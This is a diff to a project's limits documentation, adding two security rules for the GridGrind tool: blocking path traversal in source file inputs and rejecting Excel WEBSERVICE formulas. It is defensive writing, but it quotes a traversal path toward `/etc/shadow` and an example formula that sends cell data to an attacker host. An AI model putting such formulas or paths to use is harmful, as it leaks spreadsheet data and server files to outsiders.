@@ -321,6 +321,46 @@ existing path components are checked.
 
 ---
 
+### LIM-030 — Source File Path Confinement
+
+| Field | Value |
+|:------|:------|
+| **Category** | GridGrind |
+| **Limit** | `TextSourceInput.Utf8File` and `BinarySourceInput.File` paths must not escape the working directory via relative traversal components |
+| **Error** | `InputSourceReadException`: Invalid \<kind\> path: \<path\> |
+| **Applies to** | All `TextSourceInput.Utf8File` and `BinarySourceInput.File` source references resolved via `SourceBackedPathResolver.resolvePath` |
+| **Code** | `SourceBackedPathResolver.resolvePath // LIM-030` |
+| **UX** | Not surfaced in help |
+
+`TextSourceInput.Utf8File` and `BinarySourceInput.File` allow callers to provide content from
+local files. Without confinement these inputs accept relative paths such as `../../etc/shadow`,
+which resolve outside the working directory and allow arbitrary server-side file reads.
+`SourceBackedPathResolver.resolvePath` now delegates to `ExecutionRequestPaths.normalizePath`
+(LIM-025, LIM-029), which rejects relative traversal and walks symlinks. Absolute paths remain
+allowed as explicit caller references, matching the policy applied to workbook source paths.
+
+---
+
+### LIM-031 — WEBSERVICE Formula Rejection
+
+| Field | Value |
+|:------|:------|
+| **Category** | GridGrind |
+| **Limit** | Formula inputs must not use the `WEBSERVICE` function |
+| **Error** | `IllegalArgumentException`: formula must not use the WEBSERVICE function |
+| **Applies to** | All formula-bearing input types guarded by `FormulaInputSecurity.rejectDde` |
+| **Code** | `FormulaInputSecurity.rejectDde // LIM-031` |
+| **UX** | Not surfaced in help |
+
+Excel's `WEBSERVICE` function sends an outbound HTTP GET request when the workbook is opened and
+formulas are evaluated, making it a data-exfiltration vector. A formula such as
+`=WEBSERVICE("https://attacker.example.com/collect?d="&ENCODEURL(A1))` causes the downstream
+Excel client to send cell data to an attacker-controlled server without any user interaction.
+`FormulaInputSecurity.rejectDde` now also rejects formulas beginning with `WEBSERVICE(`
+(case-insensitive) after stripping any leading `=` or `{=…}` array-formula delimiters.
+
+---
+
 ## Excel / Apache POI Structural Limits
 
 This section mixes two kinds of upstream-driven constraints:
